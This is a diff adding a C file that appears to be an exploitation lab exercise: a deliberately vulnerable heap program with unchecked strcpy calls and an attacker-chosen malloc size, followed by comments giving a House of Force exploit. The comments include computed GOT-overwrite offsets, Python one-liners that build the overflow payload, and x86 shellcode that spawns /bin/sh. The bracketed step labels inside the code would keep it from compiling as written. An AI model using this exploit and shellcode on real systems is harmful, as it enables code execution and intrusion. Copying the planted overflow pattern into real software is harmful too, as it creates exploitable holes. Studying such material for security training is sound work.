@@ -1,0 +1,43 @@
+/*
+House of force vulnerable program. 
+*/
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h> 
+
+int main(int argc, char *argv[])
+{
+        char *buf1, *buf2, *buf3;
+        if (argc != 4) {
+                printf("Usage Error\n");
+                return;
+        }
+        [1]buf1 = malloc(256);
+        [2]strcpy(buf1, argv[1]); /* Prereq 1 */
+        [3]buf2 = malloc(strtoul(argv[2], NULL, 16)); /* Prereq 2 */
+        [4]buf3 = malloc(256); /* Prereq 3 */
+        [5]strcpy(buf3, argv[3]); /* Prereq 3 */
+
+        [6]free(buf3);
+        free(buf2);
+        free(buf1);
+        return 0;
+}
+
+/* 
+free@got entry  0x08049830
+top             0x0804a108
+
+size = ((0x08049830 - 0x8) - 0x0804a108) -0x8 = 0xFFFFF718
+
+python -c 'print "A"*260 + "\xff\xff\xff\xff" +" "+"0xFFFFF718"+" "+"AAAA"' > 1
+
+control eip --> 0x41414141
+
+---
+
+heap addr is : 0x804a008
+change payload to:
+shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
+python -c 'print "A"*260 + "\xff\xff\xff\xff" +" "+"0xFFFFF718"+" "+"\x08\xa0\x04\x08"' > 1
+*/
